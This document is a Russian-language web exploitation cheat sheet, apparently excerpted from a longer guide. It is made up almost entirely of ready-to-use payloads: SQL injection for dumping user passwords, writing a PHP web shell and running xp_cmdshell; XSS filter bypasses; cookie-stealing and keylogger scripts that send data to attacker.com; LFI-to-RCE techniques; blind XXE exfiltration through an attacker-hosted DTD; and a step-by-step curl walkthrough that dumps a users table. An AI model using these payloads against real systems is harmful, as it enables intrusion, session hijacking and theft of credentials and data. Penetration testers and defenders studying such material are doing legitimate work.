# Эксплуатация уязвимостей (Exploitation)

## 1. SQL Injection (SQLi)

### Ручная эксплуатация

#### Определение количества колонок
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
# Продолжать пока не будет ошибки
```

#### UNION-based extraction
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

# Определение версии БД
' UNION SELECT @@version--
' UNION SELECT version()--

# Получение имён таблиц
' UNION SELECT table_name FROM information_schema.tables--
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--

# Получение колонок
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--

# Дамп данных
' UNION SELECT username,password FROM users--
' UNION SELECT username,password,email FROM users--
```

#### Boolean-based blind
```sql
# Проверка
' AND 1=1--
' AND 1=2--

# Получение имени БД (посимвольно)
' AND SUBSTRING(database(),1,1)='a'--
' AND ASCII(SUBSTRING(database(),1,1))>97--

# Получение имён таблиц
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>0--

# Получение таблиц
' AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)='users'--
```

#### Time-based blind
```sql
# Проверка
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--

# PostgreSQL
' AND pg_sleep(5)--

# MSSQL
'; WAITFOR DELAY '00:00:05'--

# Oracle
' AND DBMS_PIPE.RECEIVE_MESSAGE('xyz',5)--

# Получение данных (посимвольно)
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
' AND IF(ASCII(SUBSTRING(database(),1,1))>97,SLEEP(5),0)--
```

#### Error-based
```sql
# MySQL
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x23,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

# PostgreSQL
' AND 1=CAST((SELECT database()) AS INT)--

# MSSQL
' AND 1=CONVERT(INT,(SELECT TOP 1 table_name FROM information_schema.tables))--
```

#### File operations
```sql
# MySQL - чтение файла
' UNION SELECT LOAD_FILE('/etc/passwd')--

# MySQL - запись файла
' UNION SELECT '<?php system($_GET["cmd"]);?>' INTO OUTFILE '/var/www/html/shell.php'--

# PostgreSQL - чтение
'; SELECT pg_read_file('/etc/passwd')--
```

#### OS Command Execution
```sql
# MySQL (если возможно)
' UNION SELECT sys_exec('id')--

# PostgreSQL
'; COPY (SELECT 'cmd') TO '/tmp/output';

# MSSQL
'; EXEC xp_cmdshell 'whoami'--
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE--
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE--
```

## 2. Cross-Site Scripting (XSS)

### Reflected XSS

#### Базовые пейлоады
```html
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>
<body onload=alert('XSS')>
<iframe onload=alert('XSS')>
```

#### Обход фильтров
```html
# Без пробелов
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>

# Без кавычек
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

# С кодированием
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
%3Cscript%3Ealert(1)%3C/script%3E

# В JavaScript контексте
';alert(1);//
'-alert(1)-'
${alert(1)}

# В HTML атрибуте
" onmouseover="alert(1)
' onfocus='alert(1)' autofocus

# Polyglots
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

#### Cookie stealing
```html
<script>
new Image().src="http://attacker.com/steal?cookie="+document.cookie;
</script>

<script>
fetch('http://attacker.com/steal', {
  method: 'POST',
  body: document.cookie
});
</script>
```

#### Keylogger
```html
<script>
document.onkeypress = function(e) {
  fetch('http://attacker.com/log?key=' + e.key);
}
</script>
```

## 3. Local File Inclusion (LFI)

### Базовые техники
```
# Чтение файлов
/page?file=/etc/passwd
/page?file=../../../../etc/passwd

# С обходом фильтров
/page?file=....//....//....//....//etc/passwd
/page?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd
/page?file=%252e%252e%252fetc%252fpasswd

# Через null byte (PHP < 5.3.4)
/page?file=../../../../etc/passwd%00

# Через wrapper PHP
/page?file=php://filter/convert.base64-encode/resource=index.php
/page?file=php://filter/read=convert.base64-encode/resource=config.php
/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=

# Через expect
/page?file=expect://id
/page?file=expect://ls

# Через input
/page?file=php://input
POST: <?php system('id'); ?>
```

### Чувствительные файлы
```
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ
/proc/version
/var/log/apache2/access.log
/var/log/auth.log
~/.ssh/id_rsa
~/.bash_history
/var/www/html/config.php
```

### LFI to RCE
```bash
# Через логи
/page?file=../../../../var/log/apache2/access.log
# В User-Agent: <?php system('id'); ?>

# Через session
/page?file=../../../../var/lib/php/sessions/sess_SESSIONID
# В session: <?php system('id'); ?>

# Через environ
/page?file=../../../../proc/self/environ
# В HTTP_USER_AGENT: <?php system('id'); ?>
```

## 7. XML External Entity (XXE)

### Базовые XXE
```xml
<!-- Чтение файлов -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>

<!-- С обходом -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=config.php">
]>
<foo>&xxe;</foo>
```

### SSRF через XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-service:8080/">
]>
<foo>&xxe;</foo>
```

### Blind XXE
```xml
<!-- На атакующем сервере malicious.dtd -->
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/collect?data=%file;'>">
%all;

<!-- В целевом приложении -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/malicious.dtd">
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  %dtd;
  %send;
]>
<foo>test</foo>
```

### XInclude
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

### Обход фильтров
```bash

%0Acat%20/etc/passwd
$(printf%20'cat%20/etc/passwd')
```


## 14. In-Depth Exploitation Examples

### Полный пример SQLi
```bash
# 1. Определение уязвимости
curl "https://example.com/page?id=1'"

# 2. Количество колонок
curl "https://example.com/page?id=1' ORDER BY 5--"
curl "https://example.com/page?id=1' ORDER BY 10--"

# 3. UNION injection
curl "https://example.com/page?id=1' UNION SELECT 1,2,3,4,5--"

# 4. Версия БД
curl "https://example.com/page?id=1' UNION SELECT 1,version(),3,4,5--"

# 5. Имя БД
curl "https://example.com/page?id=1' UNION SELECT 1,database(),3,4,5--"

# 6. Таблицы
curl "https://example.com/page?id=1' UNION SELECT 1,group_concat(table_name),3,4,5 FROM information_schema.tables WHERE table_schema=database()--"

# 7. Колонки
curl "https://example.com/page?id=1' UNION SELECT 1,group_concat(column_name),3,4,5 FROM information_schema.columns WHERE table_name='users'--"

# 8. Данные
curl "https://example.com/page?id=1' UNION SELECT 1,group_concat(username,0x3a,password),3,4,5 FROM users--"
```

### Полный пример XSS to Account Takeover
```javascript
// 1. Найти XSS
https://example.com/search?q=<script>alert(1)</script>

// 2. Steal cookies
<script>
fetch('http://attacker.com/steal?cookie='+document.cookie);
</script>

// 3. Используем cookie для доступа
curl -H "Cookie: stolen_cookie_value" https://example.com/account
```
